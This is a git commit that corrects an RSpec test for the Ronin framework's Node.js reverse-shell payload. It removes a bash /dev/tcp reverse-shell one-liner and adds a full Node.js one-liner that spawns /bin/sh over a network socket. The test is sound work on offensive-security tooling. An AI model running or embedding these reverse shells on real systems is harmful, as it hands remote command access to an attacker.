ba65a95d84c39cbca5de8a0975a02e9aa05beb7e
Postmodern <postmodern.mod3@gmail.com>
2024-03-04 22:40:35 -0800

    Fixed the copy/pasted specs for `cmd/node/reverse_shell`.

--- spec/builtin/cmd/node/reverse_shell_spec.rb
+++ spec/builtin/cmd/node/reverse_shell_spec.rb
@@ -1,7 +1,7 @@
 require 'spec_helper'
-require 'ronin/payloads/builtin/cmd/bash/reverse_shell'
+require 'ronin/payloads/builtin/cmd/node/reverse_shell'
 
-describe Ronin::Payloads::CMD::Bash::ReverseShell do
+describe Ronin::Payloads::CMD::NodeJS::ReverseShell do
   it "must inherit from Ronin::Payloads::CommandPayload" do
     expect(described_class).to be < Ronin::Payloads::CommandPayload
   end
@@ -9,8 +9,8 @@ describe Ronin::Payloads::CMD::Bash::ReverseShell do
   describe ".id" do
     subject { described_class }
 
-    it "must equal 'cmd/bash/reverse_shell'" do
-      expect(subject.id).to eq('cmd/bash/reverse_shell')
+    it "must equal 'cmd/node/reverse_shell'" do
+      expect(subject.id).to eq('cmd/node/reverse_shell')
     end
   end
 
@@ -29,8 +29,10 @@ describe Ronin::Payloads::CMD::Bash::ReverseShell do
   describe "#build" do
     before { subject.build }
 
-    it "must build an `bash` command that connects back to the host and port params" do
-      expect(subject.payload).to eq("bash -i >& /dev/tcp/#{host}/#{port} 0>&1")
+    it "must build an `node` command that connects back to the host and port params" do
+      expect(subject.payload).to eq(
+        %{node -e '(function(){var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(#{port}, #{host.dump}, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();'}
+      )
     end
   end
 end
